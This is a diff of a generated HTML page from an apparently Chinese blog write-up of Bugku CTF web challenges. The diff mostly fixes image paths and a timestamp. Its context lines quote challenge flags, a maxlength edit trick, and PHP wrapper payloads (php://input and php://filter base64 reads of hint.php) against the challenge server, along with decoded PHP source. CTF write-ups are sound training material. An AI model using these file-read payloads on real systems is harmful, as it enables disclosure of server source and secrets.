@@ -107,7 +107,7 @@
 <meta property="og:image" content="https://ifpop.github.io/2019/08/04/Bugku-web/1563085751184.png">
 <meta property="og:image" content="https://ifpop.github.io/2019/08/04/Bugku-web/1563086276292.png">
 <meta property="og:image" content="https://ifpop.github.io/2019/08/04/Bugku-web/1563086305533.png">
-<meta property="og:image" content="https://ifpop.github.io/2019/08/04/Bugku-web/Users/deer/AppData/Roaming/Typora/typora-user-images/1563087740125.png">
+<meta property="og:image" content="https://ifpop.github.io/2019/08/04/Bugku-web/1563087740125.png">
 <meta property="og:image" content="https://ifpop.github.io/2019/08/04/Bugku-web/1563088574560.png">
 <meta property="og:image" content="https://ifpop.github.io/2019/08/04/Bugku-web/1563096419448.png">
 <meta property="og:image" content="https://ifpop.github.io/2019/08/04/Bugku-web/1563152873367.png">
@@ -130,7 +130,7 @@
 <meta property="og:image" content="https://ifpop.github.io/2019/08/04/Bugku-web/1563349709402.png">
 <meta property="og:image" content="https://ifpop.github.io/2019/08/04/Bugku-web/1563349760286.png">
 <meta property="og:image" content="https://ifpop.github.io/2019/08/04/Bugku-web/1563351052361.png">
-<meta property="og:updated_time" content="2019-08-31T02:00:56.223Z">
+<meta property="og:updated_time" content="2019-10-11T10:28:50.721Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Bugku_web">
 <meta name="twitter:description" content="Web2打开链接：  查看源码，查找flag KEY{Web-2-bugKssNNikls9100} 计算器打开链接，发现只能输入一位  按f12打开控制台，查看相关源代码，发现maxlen=1，将其改为2，  重新输入，结果21即可得到flag{CTF-bugku-0032} ##web基础$_GET 打开链接,发现以下代码： 1234$what=$_GET[&apos;what&apos;];echo $what">
@@ -562,7 +562,7 @@
 <p>这里就要使用php伪协议了。这道题目为了解决第二个条件，要用到    “php://input”协议。大致的意思是让　　txt=php://input ，之后在post过去一个字符串</p>
 <p><code>http://123.206.87.240:8006/index.php?txt=php://input</code></p>
 <p><code>welcome to the bugkuctf</code>  //将其post上去</p>
-<p><img src="/2019/08/04/Bugku-web/Users\deer\AppData\Roaming\Typora\typora-user-images\1563087740125.png" alt="1563087740125"></p>
+<p><img src="/2019/08/04/Bugku-web/1563087740125.png" alt="1563087740125"></p>
 <p>此时根据提示我们可以把包含的文件读出来了，这里要用到php的第二个伪协议：php://filter</p>
 <p><code>txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php</code>（简单来说就是利用伪协议读取所包含文件的base64值）</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgIA0KICANCmNsYXNzIEZsYWd7Ly9mbGFnLnBocCAgDQogICAgcHVibGljICRmaWxlOyAgDQogICAgcHVibGljIGZ1bmN0aW9uIF9fdG9zdHJpbmcoKXsgIA0KICAgICAgICBpZihpc3NldCgkdGhpcy0+ZmlsZSkpeyAgDQogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgDQoJCQllY2hvICI8YnI+IjsNCgkJcmV0dXJuICgiZ29vZCIpOw0KICAgICAgICB9ICANCiAgICB9ICANCn0gIA0KPz4gIA== </span><br><span class="line"></span><br><span class="line">解码：</span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  <span class="comment">//如果文件为空， </span></span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">return</span> (<span class="string">"good"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
